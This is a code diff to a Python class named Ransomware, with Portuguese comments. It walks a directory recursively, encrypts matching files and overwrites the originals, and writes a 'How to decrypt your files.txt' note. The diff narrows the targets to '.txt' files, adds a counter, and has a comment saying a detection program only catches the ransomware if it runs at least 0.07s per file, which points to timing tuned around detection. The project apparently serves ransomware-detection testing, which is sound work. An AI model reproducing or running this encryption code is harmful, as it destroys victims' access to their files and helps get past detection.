@@ -31,8 +31,10 @@ class Ransomware:
             file.write(f"To decrypt your files, run 'python Ransomware.py -p \" {directory} \" --decrypt'")
 
     # Deletar o arquivo de instruções
+
     def deleteTxt(directory):
-        os.remove(directory + '/' + 'How to decrypt your files.txt')
+        if os.path.exists(directory + '/' + 'How to decrypt your files.txt'):
+            os.remove(directory + '/' + 'How to decrypt your files.txt')
 
     # Criptografar/Descriptografar os arquivos
     def run(directory, key, action):
@@ -41,14 +43,14 @@ class Ransomware:
             Ransomware.deleteTxt(directory)
 
         # Criar uma lista com as extensões de arquivos
-        file_extensions = [line.rstrip() for line in open('./modules/file_extensions.txt')]
-
+        #file_extensions = [line.rstrip() for line in open('./modules/file_extensions.txt')]
+        file_extensions = [".txt"]
+        crypto_count = 0
         # Pegar os arquivos recursivamente para criptografar/descriptografar
         for current_path, _, files_in_current_path in os.walk(directory):
             for file in files_in_current_path:
                 if pathlib.Path(file).suffix in file_extensions:
                     file_abs_full_path = os.path.join(current_path, file)
-                    print(file)
 
                     with open(file_abs_full_path, 'rb') as file_bytes:
                         file_data = file_bytes.read()
@@ -59,9 +61,11 @@ class Ransomware:
 
                     with open(file_abs_full_path, 'wb') as file_bytes:
                         file_bytes.write(final_data)
-                        print(str(os.getpid()))
-                        # sleep(0.020)
+                        # print(str(os.getpid()))
+                        # sleep(0.00000001)
                         # O programa só pega se o ransomware demorar no min 0.07s
+                crypto_count += 1
+                print(crypto_count)
 
      # Criar o txt caso esteja criptografando
         if action == "encrypt":
